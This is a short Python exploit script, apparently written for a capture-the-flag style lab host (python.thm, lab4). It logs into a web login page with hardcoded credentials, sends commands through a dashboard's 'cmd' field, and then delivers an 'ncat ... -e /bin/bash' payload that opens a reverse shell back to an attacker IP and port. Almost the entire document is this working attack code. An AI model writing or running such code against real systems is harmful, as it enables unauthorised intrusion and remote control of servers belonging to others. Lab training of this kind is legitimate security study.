# A well-automated exploit should handle:

#    Bypassing authentication via brute-forcing the login panel
#    Maintaining access by automating session management
#    Escalating privileges using RCE to gain a reverse shell


import requests

LOGIN_URL = "http://python.thm/labs/lab4/login.php"
EXECUTE_URL = "http://python.thm/labs/lab4/dashboard.php"
USERNAME = "admin"
PASSWORD = "password123"
ATTACKER_IP = "10.201.25.28"
ATTACKER_PORT = "4444"

def authenticate():
    session = requests.Session()
    response = session.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})

    if "Welcome" in response.text:
        print("[+] Authentication successful.")
        return session
    return None

def execute_command(session, command):
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if "Session expired" in response.text:
        print("[-] Session expired! Re-authenticating...")
        session = authenticate()

    print(f"[+] Output:\n{response.text}")

def get_reverse_shell(session, ATTACKER_IP, ATTACKER_PORT):
    payload = f"ncat {ATTACKER_IP} {ATTACKER_PORT} -e /bin/bash"
    execute_command(session, payload)

def main():
    session = authenticate()
    if session:
        execute_command(session, "whoami")
        get_reverse_shell(session, ATTACKER_IP, ATTACKER_PORT)


if __name__ == '__main__':
    main()